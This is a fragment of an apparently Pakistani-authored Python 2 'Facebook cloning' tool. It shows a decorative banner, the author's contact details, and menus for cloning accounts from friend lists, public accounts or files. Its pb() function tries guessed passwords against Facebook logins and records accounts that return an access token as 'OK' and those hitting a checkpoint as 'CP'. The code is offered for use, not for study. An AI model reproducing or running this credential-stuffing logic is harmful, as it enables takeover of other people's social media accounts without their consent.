...
logo='''
\033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
\033[1;94m ┈┈┈▕▕H4 Ã4▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕H4 Ã4▏▏┈┈┈
\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;94mShabirBaloch.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
\033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
\033[1;96m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
\033[1;96m................\033[1;93mMahummadHãîdèr\033[1;91m...............
\033[1;96m................\033[1;93m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............

\033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

\033[1;91m☞ Auther     : B4_HÃîDÈr_M4_MASTER
\033[1;92m☞ WhatsApp   : 03213915156
\033[1;95m☞ YouTube    : https://www.youtube.com/@mahummadayaantricks9498
...
def menu():
	...
	cb()
	print (logo)
	print (S + '[☆] ' + G + 'ID Name: ' + R + a['Mahummad Hãîdèr'])
	print (S + '[☆] ' + G + 'User ID: ' + R + a['https://www.facebook.com/profile.php?id=100068475922048'])
	print
	print (S + 50*'-')
	print
	print (S + '[' + P + '☞1' + S + ']' + 1 + ' Fast Cloning New Update')
	print (S + '[' + P + '☞2' + S + ']' + 2 + ' Update B4_BALOCH Tool')
	print (S + '[' + P + '☞3' + S + ']' + 3 + ' B4_BALOCH WhatsApp Group')
	print (S + '[' + Y + '☞4' + S + ']' + 4 + ' Log Out')
	print (S + '[' + Y + '☞0' + S + ']' + 0 + ' Exit')
	print
	print (S + 50*'-')
	print
	mb()
...
def mb():
	...
	if bm =='':
	    ...
	    psb('WhatsApp Num 03213915156✓')
	    psb('WellCome To B4_HÃÎDÈR')
	    psb('Congratulations B4_HÃÎDÈR Tool Has Been Updated Successfully')
	    psb('🔓User Name☆ Yes Paid Tool✓')
	    psb('🔓Password ☆ Now Unlock✓')
	    psb('Subscrib My Youtube Channel Mahummad Ayaan Tricks channel✓')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/B4_HÃÎDÈR && python2 B4.py')
	elif bm =='3':
...
def pak():
	...
	cb()
	print (logo)
	print (S + '[' + P + '☞1' + S + ']' + 1 + ' Clone With Friend List')
	print (S + '[' + P + '☞2' + S + ']' + 2 + ' Clone From Public Account')
	print (S + '[' + Y + '☞3' + S + ']' + 3 + ' Clone From File')
	print (S + '[' + R + '☞0' + S + ']' + 0 + ' Back')
	print
	print (S + 50*'-')
	print
	pb()
...
def pb():
		...
		try:
			...
			if 'www.facebook.com' in k['error_msg']:
			    ...
			    if 'access_token' in k:
			        ...
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[HÃÎDÈR-CP] ♡ '+user+' ♡ '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(G+'[AYAAN-OK] ♡ '+user+' ♡ '+ps2)
			                oks.append(user+ps2)
			            else:
			                ...
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[HÃÎDÈR-CP] ♡ '+user+' ♡ '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[AYAAN-OK] ♡ '+user+' ♡ '+ps3)
			                        oks.append(user+ps3)
			                    else:
	...
	print(S+50*'-')
	print
	print(S+'Process has been completed CP ID Open After 10 Days ')
